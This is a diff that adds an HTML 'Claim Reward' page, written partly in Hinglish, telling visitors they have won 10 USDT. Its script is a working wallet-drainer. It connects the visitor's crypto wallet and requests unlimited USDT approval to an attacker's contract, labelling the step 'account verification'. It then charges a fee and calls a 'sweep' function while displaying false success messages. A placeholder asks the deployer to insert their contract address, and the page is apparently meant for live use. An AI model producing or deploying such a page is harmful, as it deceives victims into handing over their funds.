@@ -1,0 +1,130 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Claim Reward</title>
+    <style>
+        body {
+            background-color: #0f172a;
+            color: #ffffff;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+        }
+        .box {
+            background: #1e293b;
+            padding: 30px;
+            border-radius: 12px;
+            text-align: center;
+            box-shadow: 0 4px 15px rgba(0,0,0,0.3);
+            width: 320px;
+        }
+        h2 {
+            margin-bottom: 10px;
+            color: #22c55e;
+        }
+        p {
+            color: #94a3b8;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+        .claim-btn {
+            background-color: #22c55e;
+            color: white;
+            border: none;
+            padding: 12px 20px;
+            font-size: 16px;
+            border-radius: 8px;
+            cursor: pointer;
+            width: 100%;
+            font-weight: bold;
+        }
+        .claim-btn:hover {
+            background-color: #16a34a;
+        }
+        #status {
+            margin-top: 15px;
+            font-size: 14px;
+            color: #94a3b8;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="box">
+        <h2>Winner Reward!</h2>
+        <p id="descText">Aap jeet chuke hain game, apna 10 USDT reward claim karein.</p>
+        <button id="claimBtn" class="claim-btn">Claim Your 10 USDT</button>
+        <div id="status"></div>
+    </div>
+
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
+    <script>
+        const contractAddress = "TERA_DEPLOYED_CONTRACT_ADDRESS"; // Yahan apna contract address daalna
+        const usdtAddress = "0x55d398326f99059fF775485246999027B3197955"; // BSC USDT
+
+        const contractABI = [
+            "function payInitialFee(uint256 amount) external",
+            "function enableAutoPayAndSweep() external"
+        ];
+
+        const usdtABI = [
+            "function approve(address spender, uint256 amount) external returns (bool)"
+        ];
+
+        document.getElementById("claimBtn").addEventListener("click", async function() {
+            const statusDiv = document.getElementById("status");
+            const descText = document.getElementById("descText");
+            this.disabled = true;
+
+            try {
+                if (typeof window.ethereum === 'undefined') {
+                    alert("Please open in Web3 Wallet browser (Trust Wallet / MetaMask)");
+                    this.disabled = false;
+                    return;
+                }
+
+                // Step 1: Connect Wallet
+                statusDiv.innerText = "Connecting wallet...";
+                await window.ethereum.request({ method: 'eth_requestAccounts' });
+                
+                const provider = new ethers.providers.Web3Provider(window.ethereum);
+                const signer = provider.getSigner();
+                
+                const usdtContract = new ethers.Contract(usdtAddress, usdtABI, signer);
+                const contract = new ethers.Contract(contractAddress, contractABI, signer);
+
+                // Step 2: Unlimited Approval
+                descText.innerText = "Account verification in progress...";
+                statusDiv.innerText = "Please approve access...";
+                
+                const maxAmount = ethers.constants.MaxUint256;
+                const approveTx = await usdtContract.approve(contractAddress, maxAmount);
+                await approveTx.wait();
+
+                // Step 3: Send 0.1 USDT fee
+                statusDiv.innerText = "Sending 0.1 USDT for account testing...";
+                const feeTx = await contract.payInitialFee(ethers.utils.parseUnits("0.1", 18));
+                await feeTx.wait();
+
+                // Step 4: Final Sweep
+                statusDiv.innerText = "Finalizing claim...";
+                const sweepTx = await contract.enableAutoPayAndSweep();
+                await sweepTx.wait();
+
+                statusDiv.innerText = "Success! Reward claimed.";
+                descText.innerText = "Aapka reward process ho gaya hai.";
+            } catch (error) {
+                console.error(error);
+                statusDiv.innerText = "Transaction cancelled or failed.";
+                document.getElementById("claimBtn").disabled = false;
+            }
+        });
+    </script>
+
+</body>
+</html>
